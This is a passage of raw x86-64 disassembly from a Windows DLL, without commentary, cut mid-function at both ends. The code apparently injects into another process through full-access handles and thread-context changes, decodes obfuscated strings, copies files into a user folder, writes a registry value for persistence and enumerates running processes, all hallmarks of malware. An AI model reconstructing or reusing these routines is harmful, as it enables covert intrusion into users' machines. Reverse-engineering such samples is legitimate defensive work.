   180002588:	00 
   180002589:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   18000258e:	ff 15 a4 1b 01 00    	call   *0x11ba4(%rip)        # 0x180014138
   180002594:	4c 8d 4b d8          	lea    -0x28(%rbx),%r9
   180002598:	48 8b d6             	mov    %rsi,%rdx
   18000259b:	48 8b e8             	mov    %rax,%rbp
   18000259e:	4d 8d 47 15          	lea    0x15(%r15),%r8
   1800025a2:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
   1800025a7:	48 8b cd             	mov    %rbp,%rcx
   1800025aa:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800025af:	e8 6c 15 00 00       	call   0x180003b20
   1800025b4:	33 c0                	xor    %eax,%eax
   1800025b6:	48 8b cb             	mov    %rbx,%rcx
   1800025b9:	49 8b ff             	mov    %r15,%rdi
   1800025bc:	f3 aa                	rep stos %al,(%rdi)
   1800025be:	48 8d 0d 8f 9b 01 00 	lea    0x19b8f(%rip),%rcx        # 0x18001c154
   1800025c5:	ff 15 8d 1a 01 00    	call   *0x11a8d(%rip)        # 0x180014058
   1800025cb:	48 8b c8             	mov    %rax,%rcx
   1800025ce:	48 8d 15 63 9b 01 00 	lea    0x19b63(%rip),%rdx        # 0x18001c138
   1800025d5:	ff 15 f5 1a 01 00    	call   *0x11af5(%rip)        # 0x1800140d0
   1800025db:	48 85 c0             	test   %rax,%rax
   1800025de:	0f 84 83 00 00 00    	je     0x180002667
   1800025e4:	4c 89 64 24 50       	mov    %r12,0x50(%rsp)
   1800025e9:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800025ee:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   1800025f3:	4c 8b cd             	mov    %rbp,%r9
   1800025f6:	4c 89 64 24 40       	mov    %r12,0x40(%rsp)
   1800025fb:	45 33 c0             	xor    %r8d,%r8d
   1800025fe:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   180002603:	ba ff ff 1f 00       	mov    $0x1fffff,%edx
   180002608:	c7 44 24 30 05 00 00 	movl   $0x5,0x30(%rsp)
   18000260f:	00 
   180002610:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   180002615:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000261a:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   18000261f:	e8 3c 15 00 00       	call   0x180003b60
   180002624:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   180002629:	48 85 c9             	test   %rcx,%rcx
   18000262c:	74 39                	je     0x180002667
   18000262e:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180002633:	c7 84 24 a0 00 00 00 	movl   $0x10000b,0xa0(%rsp)
   18000263a:	0b 00 10 00 
   18000263e:	ff 15 84 1a 01 00    	call   *0x11a84(%rip)        # 0x1800140c8
   180002644:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   180002649:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   18000264e:	48 89 b4 24 f0 00 00 	mov    %rsi,0xf0(%rsp)
   180002655:	00 
   180002656:	ff 15 c4 1a 01 00    	call   *0x11ac4(%rip)        # 0x180014120
   18000265c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   180002661:	ff 15 e1 19 01 00    	call   *0x119e1(%rip)        # 0x180014048
   180002667:	b9 70 17 00 00       	mov    $0x1770,%ecx
   18000266c:	ff 15 f6 19 01 00    	call   *0x119f6(%rip)        # 0x180014068
   180002672:	48 8b ac 24 90 05 00 	mov    0x590(%rsp),%rbp
   180002679:	00 
   18000267a:	48 8b b4 24 98 05 00 	mov    0x598(%rsp),%rsi
   180002681:	00 
   180002682:	48 8b 8c 24 40 05 00 	mov    0x540(%rsp),%rcx
   180002689:	00 
   18000268a:	48 33 cc             	xor    %rsp,%rcx
   18000268d:	e8 1e 15 00 00       	call   0x180003bb0
   180002692:	48 81 c4 50 05 00 00 	add    $0x550,%rsp
   180002699:	41 5f                	pop    %r15
   18000269b:	41 5e                	pop    %r14
   18000269d:	41 5c                	pop    %r12
   18000269f:	5f                   	pop    %rdi
   1800026a0:	5b                   	pop    %rbx
   1800026a1:	c3                   	ret
   1800026a2:	cc                   	int3
   1800026a3:	cc                   	int3
   1800026a4:	cc                   	int3
   1800026a5:	cc                   	int3
   1800026a6:	cc                   	int3
   1800026a7:	cc                   	int3
   1800026a8:	cc                   	int3
   1800026a9:	cc                   	int3
   1800026aa:	cc                   	int3
   1800026ab:	cc                   	int3
   1800026ac:	cc                   	int3
   1800026ad:	cc                   	int3
   1800026ae:	cc                   	int3
   1800026af:	cc                   	int3
   1800026b0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800026b5:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800026ba:	55                   	push   %rbp
   1800026bb:	48 8d ac 24 b0 fa ff 	lea    -0x550(%rsp),%rbp
   1800026c2:	ff 
   1800026c3:	48 81 ec 50 06 00 00 	sub    $0x650,%rsp
   1800026ca:	48 8b 05 37 c9 01 00 	mov    0x1c937(%rip),%rax        # 0x18001f008
   1800026d1:	48 33 c4             	xor    %rsp,%rax
   1800026d4:	48 89 85 40 05 00 00 	mov    %rax,0x540(%rbp)
   1800026db:	33 db                	xor    %ebx,%ebx
   1800026dd:	48 8d bd 00 01 00 00 	lea    0x100(%rbp),%rdi
   1800026e4:	33 c0                	xor    %eax,%eax
   1800026e6:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   1800026eb:	b9 04 01 00 00       	mov    $0x104,%ecx
   1800026f0:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   1800026f5:	f3 aa                	rep stos %al,(%rdi)
   1800026f7:	8d 4b 06             	lea    0x6(%rbx),%ecx
   1800026fa:	48 8d 15 9f 09 00 00 	lea    0x99f(%rip),%rdx        # 0x1800030a0
   180002701:	ff 15 69 19 01 00    	call   *0x11969(%rip)        # 0x180014070
   180002707:	85 c0                	test   %eax,%eax
   180002709:	0f 84 d4 04 00 00    	je     0x180002be3
   18000270f:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   180002714:	48 8d 95 00 01 00 00 	lea    0x100(%rbp),%rdx
   18000271b:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180002721:	ff 15 31 1a 01 00    	call   *0x11a31(%rip)        # 0x180014158
   180002727:	85 c0                	test   %eax,%eax
   180002729:	0f 84 b4 04 00 00    	je     0x180002be3
   18000272f:	33 c0                	xor    %eax,%eax
   180002731:	48 8d bd 20 03 00 00 	lea    0x320(%rbp),%rdi
   180002738:	b9 04 01 00 00       	mov    $0x104,%ecx
   18000273d:	8d 53 1a             	lea    0x1a(%rbx),%edx
   180002740:	f3 aa                	rep stos %al,(%rdi)
   180002742:	48 8d 85 20 03 00 00 	lea    0x320(%rbp),%rax
   180002749:	33 c9                	xor    %ecx,%ecx
   18000274b:	45 33 c9             	xor    %r9d,%r9d
   18000274e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002753:	45 33 c0             	xor    %r8d,%r8d
   180002756:	ff 15 d4 1b 01 00    	call   *0x11bd4(%rip)        # 0x180014330
   18000275c:	85 c0                	test   %eax,%eax
   18000275e:	0f 88 7f 04 00 00    	js     0x180002be3
   180002764:	39 1d da d4 01 00    	cmp    %ebx,0x1d4da(%rip)        # 0x18001fc44
   18000276a:	4c 89 b4 24 68 06 00 	mov    %r14,0x668(%rsp)
   180002771:	00 
   180002772:	4c 8d 35 87 d8 ff ff 	lea    -0x2779(%rip),%r14        # 0x180000000
   180002779:	0f 84 80 01 00 00    	je     0x1800028ff
   18000277f:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   180002786:	48 8d 85 00 01 00 00 	lea    0x100(%rbp),%rax
   18000278d:	8d 53 02             	lea    0x2(%rbx),%edx
   180002790:	48 8d 89 80 00 00 00 	lea    0x80(%rcx),%rcx
   180002797:	0f 10 00             	movups (%rax),%xmm0
   18000279a:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   18000279e:	48 8d 80 80 00 00 00 	lea    0x80(%rax),%rax
   1800027a5:	0f 11 41 80          	movups %xmm0,-0x80(%rcx)
   1800027a9:	0f 10 40 a0          	movups -0x60(%rax),%xmm0
   1800027ad:	0f 11 49 90          	movups %xmm1,-0x70(%rcx)
   1800027b1:	0f 10 48 b0          	movups -0x50(%rax),%xmm1
   1800027b5:	0f 11 41 a0          	movups %xmm0,-0x60(%rcx)
   1800027b9:	0f 10 40 c0          	movups -0x40(%rax),%xmm0
   1800027bd:	0f 11 49 b0          	movups %xmm1,-0x50(%rcx)
   1800027c1:	0f 10 48 d0          	movups -0x30(%rax),%xmm1
   1800027c5:	0f 11 41 c0          	movups %xmm0,-0x40(%rcx)
   1800027c9:	0f 10 40 e0          	movups -0x20(%rax),%xmm0
   1800027cd:	0f 11 49 d0          	movups %xmm1,-0x30(%rcx)
   1800027d1:	0f 10 48 f0          	movups -0x10(%rax),%xmm1
   1800027d5:	0f 11 41 e0          	movups %xmm0,-0x20(%rcx)
   1800027d9:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   1800027dd:	48 83 ea 01          	sub    $0x1,%rdx
   1800027e1:	75 ad                	jne    0x180002790
   1800027e3:	8b 00                	mov    (%rax),%eax
   1800027e5:	ba 5c 00 00 00       	mov    $0x5c,%edx
   1800027ea:	89 01                	mov    %eax,(%rcx)
   1800027ec:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   1800027f3:	e8 cc 26 00 00       	call   0x180004ec4
   1800027f8:	48 8b f8             	mov    %rax,%rdi
   1800027fb:	48 85 c0             	test   %rax,%rax
   1800027fe:	75 05                	jne    0x180002805
   180002800:	48 8b cb             	mov    %rbx,%rcx
   180002803:	eb 10                	jmp    0x180002815
   180002805:	ba 04 01 00 00       	mov    $0x104,%edx
   18000280a:	48 8b cf             	mov    %rdi,%rcx
   18000280d:	e8 9e 51 00 00       	call   0x1800079b0
   180002812:	48 8b c8             	mov    %rax,%rcx
   180002815:	33 c0                	xor    %eax,%eax
   180002817:	4c 8d 85 10 02 00 00 	lea    0x210(%rbp),%r8
   18000281e:	f3 aa                	rep stos %al,(%rdi)
   180002820:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   180002827:	48 8d 15 32 99 01 00 	lea    0x19932(%rip),%rdx        # 0x18001c160
   18000282e:	e8 fd f6 ff ff       	call   0x180001f30
   180002833:	48 8d 8d 10 02 00 00 	lea    0x210(%rbp),%rcx
   18000283a:	ff 15 50 18 01 00    	call   *0x11850(%rip)        # 0x180014090
   180002840:	83 f8 ff             	cmp    $0xffffffff,%eax
   180002843:	0f 84 b6 00 00 00    	je     0x1800028ff
   180002849:	b9 10 00 00 00       	mov    $0x10,%ecx
   18000284e:	e8 81 13 00 00       	call   0x180003bd4
   180002853:	4c 8b c8             	mov    %rax,%r9
   180002856:	48 8b f8             	mov    %rax,%rdi
   180002859:	33 c0                	xor    %eax,%eax
   18000285b:	b9 10 00 00 00       	mov    $0x10,%ecx
   180002860:	f3 aa                	rep stos %al,(%rdi)
   180002862:	49 8b f9             	mov    %r9,%rdi
   180002865:	48 8b d3             	mov    %rbx,%rdx
   180002868:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   18000286f:	00 
   180002870:	42 0f b6 8c 32 f8 01 	movzbl 0x201f8(%rdx,%r14,1),%ecx
   180002877:	02 00 
   180002879:	48 83 c2 03          	add    $0x3,%rdx
   18000287d:	88 0f                	mov    %cl,(%rdi)
   18000287f:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180002883:	48 83 fa 2d          	cmp    $0x2d,%rdx
   180002887:	7c e7                	jl     0x180002870
   180002889:	4c 8d 85 10 02 00 00 	lea    0x210(%rbp),%r8
   180002890:	49 8b d1             	mov    %r9,%rdx
   180002893:	48 8d 8d 30 04 00 00 	lea    0x430(%rbp),%rcx
   18000289a:	e8 91 f6 ff ff       	call   0x180001f30
   18000289f:	33 c0                	xor    %eax,%eax
   1800028a1:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1800028a5:	33 d2                	xor    %edx,%edx
   1800028a7:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1800028ac:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
   1800028b1:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1800028b6:	44 8d 40 68          	lea    0x68(%rax),%r8d
   1800028ba:	e8 11 2a 00 00       	call   0x1800052d0
   1800028bf:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1800028c4:	45 33 c9             	xor    %r9d,%r9d
   1800028c7:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1800028cc:	48 8d 95 30 04 00 00 	lea    0x430(%rbp),%rdx
   1800028d3:	48 8d 45 80          	lea    -0x80(%rbp),%rax
   1800028d7:	45 33 c0             	xor    %r8d,%r8d
   1800028da:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800028df:	33 c9                	xor    %ecx,%ecx
   1800028e1:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1800028e6:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1800028eb:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1800028ef:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   1800028f3:	ff 15 f7 17 01 00    	call   *0x117f7(%rip)        # 0x1800140f0
   1800028f9:	89 1d 45 d3 01 00    	mov    %ebx,0x1d345(%rip)        # 0x18001fc44
   1800028ff:	33 c0                	xor    %eax,%eax
   180002901:	48 8d 7d f0          	lea    -0x10(%rbp),%rdi
   180002905:	b9 04 01 00 00       	mov    $0x104,%ecx
   18000290a:	4c 8d 85 20 03 00 00 	lea    0x320(%rbp),%r8
   180002911:	f3 aa                	rep stos %al,(%rdi)
   180002913:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002917:	48 8d 15 52 98 01 00 	lea    0x19852(%rip),%rdx        # 0x18001c170
   18000291e:	e8 0d f6 ff ff       	call   0x180001f30
   180002923:	33 d2                	xor    %edx,%edx
   180002925:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002929:	ff 15 d9 17 01 00    	call   *0x117d9(%rip)        # 0x180014108
   18000292f:	85 c0                	test   %eax,%eax
   180002931:	0f 84 d0 02 00 00    	je     0x180002c07
   180002937:	ba 5c 00 00 00       	mov    $0x5c,%edx
   18000293c:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   180002943:	e8 7c 25 00 00       	call   0x180004ec4
   180002948:	4c 8b c8             	mov    %rax,%r9
   18000294b:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   18000294f:	48 8d 15 76 95 01 00 	lea    0x19576(%rip),%rdx        # 0x18001becc
   180002956:	48 8b f8             	mov    %rax,%rdi
   180002959:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   18000295d:	e8 ce f5 ff ff       	call   0x180001f30
   180002962:	45 33 c0             	xor    %r8d,%r8d
   180002965:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   180002969:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   180002970:	ff 15 0a 17 01 00    	call   *0x1170a(%rip)        # 0x180014080
   180002976:	85 c0                	test   %eax,%eax
   180002978:	0f 84 5d 02 00 00    	je     0x180002bdb
   18000297e:	48 85 ff             	test   %rdi,%rdi
   180002981:	75 05                	jne    0x180002988
   180002983:	48 8b cb             	mov    %rbx,%rcx
   180002986:	eb 10                	jmp    0x180002998
   180002988:	ba 04 01 00 00       	mov    $0x104,%edx
   18000298d:	48 8b cf             	mov    %rdi,%rcx
   180002990:	e8 1b 50 00 00       	call   0x1800079b0
   180002995:	48 8b c8             	mov    %rax,%rcx
   180002998:	33 c0                	xor    %eax,%eax
   18000299a:	4c 8d 0d df 97 01 00 	lea    0x197df(%rip),%r9        # 0x18001c180
   1800029a1:	f3 aa                	rep stos %al,(%rdi)
   1800029a3:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   1800029aa:	4c 8d 85 00 01 00 00 	lea    0x100(%rbp),%r8
   1800029b1:	48 8d 15 dc 97 01 00 	lea    0x197dc(%rip),%rdx        # 0x18001c194
   1800029b8:	e8 73 f5 ff ff       	call   0x180001f30
   1800029bd:	ba 5c 00 00 00       	mov    $0x5c,%edx
   1800029c2:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800029c6:	e8 f9 24 00 00       	call   0x180004ec4
   1800029cb:	48 8b f8             	mov    %rax,%rdi
   1800029ce:	48 85 c0             	test   %rax,%rax
   1800029d1:	75 05                	jne    0x1800029d8
   1800029d3:	48 8b cb             	mov    %rbx,%rcx
   1800029d6:	eb 10                	jmp    0x1800029e8
   1800029d8:	ba 04 01 00 00       	mov    $0x104,%edx
   1800029dd:	48 8b cf             	mov    %rdi,%rcx
   1800029e0:	e8 cb 4f 00 00       	call   0x1800079b0
   1800029e5:	48 8b c8             	mov    %rax,%rcx
   1800029e8:	33 c0                	xor    %eax,%eax
   1800029ea:	4c 8d 0d 8f 97 01 00 	lea    0x1978f(%rip),%r9        # 0x18001c180
   1800029f1:	f3 aa                	rep stos %al,(%rdi)
   1800029f3:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1800029f7:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   1800029fb:	48 8d 15 92 97 01 00 	lea    0x19792(%rip),%rdx        # 0x18001c194
   180002a02:	e8 29 f5 ff ff       	call   0x180001f30
   180002a07:	45 33 c0             	xor    %r8d,%r8d
   180002a0a:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   180002a0e:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   180002a15:	ff 15 65 16 01 00    	call   *0x11665(%rip)        # 0x180014080
   180002a1b:	85 c0                	test   %eax,%eax
   180002a1d:	0f 84 b8 01 00 00    	je     0x180002bdb
   180002a23:	ba 5c 00 00 00       	mov    $0x5c,%edx
   180002a28:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   180002a2f:	e8 90 24 00 00       	call   0x180004ec4
   180002a34:	48 8b f8             	mov    %rax,%rdi
   180002a37:	48 85 c0             	test   %rax,%rax
   180002a3a:	75 05                	jne    0x180002a41
   180002a3c:	48 8b cb             	mov    %rbx,%rcx
   180002a3f:	eb 10                	jmp    0x180002a51
   180002a41:	ba 04 01 00 00       	mov    $0x104,%edx
   180002a46:	48 8b cf             	mov    %rdi,%rcx
   180002a49:	e8 62 4f 00 00       	call   0x1800079b0
   180002a4e:	48 8b c8             	mov    %rax,%rcx
   180002a51:	33 c0                	xor    %eax,%eax
   180002a53:	4c 8d 0d be 96 01 00 	lea    0x196be(%rip),%r9        # 0x18001c118
   180002a5a:	f3 aa                	rep stos %al,(%rdi)
   180002a5c:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   180002a63:	4c 8d 85 00 01 00 00 	lea    0x100(%rbp),%r8
   180002a6a:	48 8d 15 23 97 01 00 	lea    0x19723(%rip),%rdx        # 0x18001c194
   180002a71:	e8 ba f4 ff ff       	call   0x180001f30
   180002a76:	ba 5c 00 00 00       	mov    $0x5c,%edx
   180002a7b:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002a7f:	e8 40 24 00 00       	call   0x180004ec4
   180002a84:	48 8b f8             	mov    %rax,%rdi
   180002a87:	48 85 c0             	test   %rax,%rax
   180002a8a:	75 05                	jne    0x180002a91
   180002a8c:	48 8b cb             	mov    %rbx,%rcx
   180002a8f:	eb 10                	jmp    0x180002aa1
   180002a91:	ba 04 01 00 00       	mov    $0x104,%edx
   180002a96:	48 8b cf             	mov    %rdi,%rcx
   180002a99:	e8 12 4f 00 00       	call   0x1800079b0
   180002a9e:	48 8b c8             	mov    %rax,%rcx
   180002aa1:	33 c0                	xor    %eax,%eax
   180002aa3:	4c 8d 0d 6e 96 01 00 	lea    0x1966e(%rip),%r9        # 0x18001c118
   180002aaa:	f3 aa                	rep stos %al,(%rdi)
   180002aac:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002ab0:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   180002ab4:	48 8d 15 d9 96 01 00 	lea    0x196d9(%rip),%rdx        # 0x18001c194
   180002abb:	e8 70 f4 ff ff       	call   0x180001f30
   180002ac0:	45 33 c0             	xor    %r8d,%r8d
   180002ac3:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   180002ac7:	48 8d 8d 00 01 00 00 	lea    0x100(%rbp),%rcx
   180002ace:	ff 15 ac 15 01 00    	call   *0x115ac(%rip)        # 0x180014080
   180002ad4:	85 c0                	test   %eax,%eax
   180002ad6:	0f 84 ff 00 00 00    	je     0x180002bdb
   180002adc:	b9 08 00 00 00       	mov    $0x8,%ecx
   180002ae1:	48 89 b4 24 60 06 00 	mov    %rsi,0x660(%rsp)
   180002ae8:	00 
   180002ae9:	e8 e6 10 00 00       	call   0x180003bd4
   180002aee:	48 8b f0             	mov    %rax,%rsi
   180002af1:	48 8b f8             	mov    %rax,%rdi
   180002af4:	33 c0                	xor    %eax,%eax
   180002af6:	b9 08 00 00 00       	mov    $0x8,%ecx
   180002afb:	f3 aa                	rep stos %al,(%rdi)
   180002afd:	48 8b fe             	mov    %rsi,%rdi
   180002b00:	48 8b d3             	mov    %rbx,%rdx
   180002b03:	0f 1f 40 00          	nopl   0x0(%rax)
   180002b07:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180002b0e:	00 00 
   180002b10:	42 0f b6 8c 32 e0 01 	movzbl 0x201e0(%rdx,%r14,1),%ecx
   180002b17:	02 00 
   180002b19:	48 83 c2 03          	add    $0x3,%rdx
   180002b1d:	88 0f                	mov    %cl,(%rdi)
   180002b1f:	48 8d 7f 01          	lea    0x1(%rdi),%rdi
   180002b23:	48 83 fa 15          	cmp    $0x15,%rdx
   180002b27:	7c e7                	jl     0x180002b10
   180002b29:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   180002b2e:	e8 a1 10 00 00       	call   0x180003bd4
   180002b33:	4c 8b d0             	mov    %rax,%r10
   180002b36:	48 8b f8             	mov    %rax,%rdi
   180002b39:	33 c0                	xor    %eax,%eax
   180002b3b:	b9 2e 00 00 00       	mov    $0x2e,%ecx
   180002b40:	f3 aa                	rep stos %al,(%rdi)
   180002b42:	49 8b d2             	mov    %r10,%rdx
   180002b45:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   180002b4c:	00 00 00 00 
   180002b50:	42 0f b6 8c 33 40 02 	movzbl 0x20240(%rbx,%r14,1),%ecx
   180002b57:	02 00 
   180002b59:	48 83 c3 03          	add    $0x3,%rbx
   180002b5d:	88 0a                	mov    %cl,(%rdx)
   180002b5f:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   180002b63:	48 81 fb 87 00 00 00 	cmp    $0x87,%rbx
   180002b6a:	7c e4                	jl     0x180002b50
   180002b6c:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   180002b71:	41 b9 06 00 02 00    	mov    $0x20006,%r9d
   180002b77:	45 33 c0             	xor    %r8d,%r8d
   180002b7a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002b7f:	49 8b d2             	mov    %r10,%rdx
   180002b82:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   180002b89:	ff 15 79 14 01 00    	call   *0x11479(%rip)        # 0x180014008
   180002b8f:	85 c0                	test   %eax,%eax
   180002b91:	75 40                	jne    0x180002bd3
   180002b93:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002b97:	ff 15 9b 14 01 00    	call   *0x1149b(%rip)        # 0x180014038
   180002b9d:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180002ba2:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180002ba8:	45 33 c0             	xor    %r8d,%r8d
   180002bab:	48 8b d6             	mov    %rsi,%rdx
   180002bae:	8d 04 45 02 00 00 00 	lea    0x2(,%rax,2),%eax
   180002bb5:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180002bb9:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   180002bbd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002bc2:	ff 15 38 14 01 00    	call   *0x11438(%rip)        # 0x180014000
   180002bc8:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   180002bcd:	ff 15 45 14 01 00    	call   *0x11445(%rip)        # 0x180014018
   180002bd3:	48 8b b4 24 60 06 00 	mov    0x660(%rsp),%rsi
   180002bda:	00 
   180002bdb:	4c 8b b4 24 68 06 00 	mov    0x668(%rsp),%r14
   180002be2:	00 
   180002be3:	48 8b 8d 40 05 00 00 	mov    0x540(%rbp),%rcx
   180002bea:	48 33 cc             	xor    %rsp,%rcx
   180002bed:	e8 be 0f 00 00       	call   0x180003bb0
   180002bf2:	4c 8d 9c 24 50 06 00 	lea    0x650(%rsp),%r11
   180002bf9:	00 
   180002bfa:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   180002bfe:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   180002c02:	49 8b e3             	mov    %r11,%rsp
   180002c05:	5d                   	pop    %rbp
   180002c06:	c3                   	ret
   180002c07:	ff 15 7b 14 01 00    	call   *0x1147b(%rip)        # 0x180014088
   180002c0d:	eb cc                	jmp    0x180002bdb
   180002c0f:	cc                   	int3
   180002c10:	40 57                	rex push %rdi
   180002c12:	41 54                	push   %r12
   180002c14:	41 55                	push   %r13
   180002c16:	b8 c0 21 00 00       	mov    $0x21c0,%eax
   180002c1b:	e8 b0 fa 00 00       	call   0x1800126d0
   180002c20:	48 2b e0             	sub    %rax,%rsp
   180002c23:	48 8b 05 de c3 01 00 	mov    0x1c3de(%rip),%rax        # 0x18001f008
   180002c2a:	48 33 c4             	xor    %rsp,%rax
   180002c2d:	48 89 84 24 a0 21 00 	mov    %rax,0x21a0(%rsp)
   180002c34:	00 
   180002c35:	33 ff                	xor    %edi,%edi
   180002c37:	44 8b ef             	mov    %edi,%r13d
   180002c3a:	ff 15 f8 14 01 00    	call   *0x114f8(%rip)        # 0x180014138
   180002c40:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180002c45:	4c 8b e0             	mov    %rax,%r12
   180002c48:	48 85 c0             	test   %rax,%rax
   180002c4b:	0f 84 a5 02 00 00    	je     0x180002ef6
   180002c51:	4c 8d 8c 24 84 00 00 	lea    0x84(%rsp),%r9
   180002c58:	00 
   180002c59:	41 b8 00 20 00 00    	mov    $0x2000,%r8d
   180002c5f:	48 8d 94 24 90 00 00 	lea    0x90(%rsp),%rdx
   180002c66:	00 
   180002c67:	48 8b c8             	mov    %rax,%rcx
   180002c6a:	ff 15 88 14 01 00    	call   *0x11488(%rip)        # 0x1800140f8
   180002c70:	85 c0                	test   %eax,%eax
   180002c72:	0f 84 75 02 00 00    	je     0x180002eed
   180002c78:	f7 84 24 84 00 00 00 	testl  $0xfffffff8,0x84(%rsp)
   180002c7f:	f8 ff ff ff 
   180002c83:	4c 89 b4 24 b8 21 00 	mov    %r14,0x21b8(%rsp)
   180002c8a:	00 
   180002c8b:	44 8b f7             	mov    %edi,%r14d
   180002c8e:	0f 86 51 02 00 00    	jbe    0x180002ee5
   180002c94:	48 89 9c 24 e0 21 00 	mov    %rbx,0x21e0(%rsp)
   180002c9b:	00 
   180002c9c:	48 89 ac 24 e8 21 00 	mov    %rbp,0x21e8(%rsp)
   180002ca3:	00 
   180002ca4:	48 89 b4 24 f0 21 00 	mov    %rsi,0x21f0(%rsp)
   180002cab:	00 
   180002cac:	4c 89 bc 24 b0 21 00 	mov    %r15,0x21b0(%rsp)
   180002cb3:	00 
   180002cb4:	41 8b d6             	mov    %r14d,%edx
   180002cb7:	4c 8d 84 24 90 20 00 	lea    0x2090(%rsp),%r8
   180002cbe:	00 
   180002cbf:	41 b9 82 00 00 00    	mov    $0x82,%r9d
   180002cc5:	49 8b cc             	mov    %r12,%rcx
   180002cc8:	48 8b 94 d4 90 00 00 	mov    0x90(%rsp,%rdx,8),%rdx
   180002ccf:	00 
   180002cd0:	ff 15 a2 13 01 00    	call   *0x113a2(%rip)        # 0x180014078
   180002cd6:	85 c0                	test   %eax,%eax
   180002cd8:	0f 84 d1 01 00 00    	je     0x180002eaf
   180002cde:	ba 5c 00 00 00       	mov    $0x5c,%edx
   180002ce3:	48 8d 8c 24 90 20 00 	lea    0x2090(%rsp),%rcx
   180002cea:	00 
   180002ceb:	e8 d4 21 00 00       	call   0x180004ec4
   180002cf0:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   180002cf5:	48 8b d8             	mov    %rax,%rbx
   180002cf8:	45 85 ed             	test   %r13d,%r13d
   180002cfb:	0f 84 8e 01 00 00    	je     0x180002e8f
   180002d01:	48 8d 48 01          	lea    0x1(%rax),%rcx
   180002d05:	ff 15 4d 13 01 00    	call   *0x1134d(%rip)        # 0x180014058
   180002d0b:	33 c9                	xor    %ecx,%ecx
   180002d0d:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   180002d12:	48 8b d0             	mov    %rax,%rdx
   180002d15:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   180002d1a:	48 89 4c 24 68       	mov    %rcx,0x68(%rsp)
   180002d1f:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   180002d24:	44 8d 49 18          	lea    0x18(%rcx),%r9d
   180002d28:	48 89 4c 24 78       	mov    %rcx,0x78(%rsp)
   180002d2d:	49 8b cc             	mov    %r12,%rcx
   180002d30:	ff 15 82 13 01 00    	call   *0x11382(%rip)        # 0x1800140b8
